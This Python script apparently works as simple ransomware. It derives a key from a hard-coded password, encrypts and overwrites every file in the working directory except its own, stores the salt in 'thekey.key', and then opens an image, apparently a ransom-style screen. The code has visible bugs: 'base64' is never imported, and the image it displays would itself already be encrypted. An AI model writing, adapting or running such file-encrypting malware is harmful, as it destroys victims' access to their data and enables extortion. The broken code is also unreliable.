#!/usr/bin/env python3

import os
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
import platform
import subprocess


# Password to use for encryption
password = b"Skendings@2303"  # Make sure it's a byte string

# Salt to make the key derivation more secure
salt = os.urandom(16)

# Derive the encryption key from the password using PBKDF2
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,  # 256-bit key for Fernet
    salt=salt,
    iterations=100000,
    backend=default_backend()
)

key = base64.urlsafe_b64encode(kdf.derive(password))

# Let's find some files!
files = [] 

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file): 
        files.append(file)

print(files) 

# Write the salt to a file so we can use it for decryption later
with open("thekey.key", "wb") as thekey:
    thekey.write(salt)

# Encrypt the files using the derived key
fernet = Fernet(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = fernet.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# Display the image (Echoflux.png) when encryption is complete
def display_image(image_path):
    system = platform.system()

    if system == "Windows":
        subprocess.run(["start", image_path], shell=True)
    elif system == "Darwin":  # macOS
        subprocess.run(["open", image_path])
    elif system == "Linux":
        subprocess.run(["xdg-open", image_path])

# Call the function to display the image
display_image("Echoflux.png")
